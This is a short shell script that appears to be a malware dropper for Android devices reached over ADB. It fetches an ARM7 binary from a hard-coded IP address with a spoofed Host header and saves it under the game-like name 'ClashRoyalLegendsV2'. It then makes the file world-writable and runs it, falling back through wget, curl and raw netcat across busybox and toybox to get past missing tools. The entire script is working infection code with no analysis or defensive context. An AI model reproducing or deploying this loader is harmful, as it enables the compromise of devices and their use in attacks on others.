#!/bin/sh
# bootstrap — fetches real payload, runs it with args
URL="http://185.199.108.153/wow/ntb.arm7"
HOST="store.risesmp.cc"
OUT="/data/local/tmp/ClashRoyalLegendsV2"
ARGS="${@:-sardurumdiddy}"

# Already pushed by adb2? Just run it.
[ -x "$OUT" ] && exec "$OUT" $ARGS
[ -f "$OUT" ] && chmod 777 "$OUT" && exec "$OUT" $ARGS

# Try wget family
wget -q --header="Host: $HOST" "$URL" -O "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS
busybox wget -q --header="Host: $HOST" "$URL" -O "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS
toybox wget -q --header="Host: $HOST" "$URL" -O "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS

# Try curl family
curl -L -H "Host: $HOST" "$URL" -o "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS
busybox curl -L -H "Host: $HOST" "$URL" -o "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS
toybox curl -L -H "Host: $HOST" "$URL" -o "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS

# nc + dd to strip headers (skip first 200 bytes covers most HTTP responses)
echo 'GET /wow/ntb.arm7 HTTP/1.0\r\nHost: store.risesmp.cc\r\nConnection: close\r\n\r' | nc 185.199.108.153 80 2>/dev/null | dd bs=1 skip=200 of="$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS
echo 'GET /wow/ntb.arm7 HTTP/1.0\r\nHost: store.risesmp.cc\r\nConnection: close\r\n\r' | busybox nc 185.199.108.153 80 2>/dev/null | busybox dd bs=1 skip=200 of="$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS
echo 'GET /wow/ntb.arm7 HTTP/1.0\r\nHost: store.risesmp.cc\r\nConnection: close\r\n\r' | toybox nc 185.199.108.153 80 2>/dev/null | toybox dd bs=1 skip=200 of="$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" $ARGS

exit 1
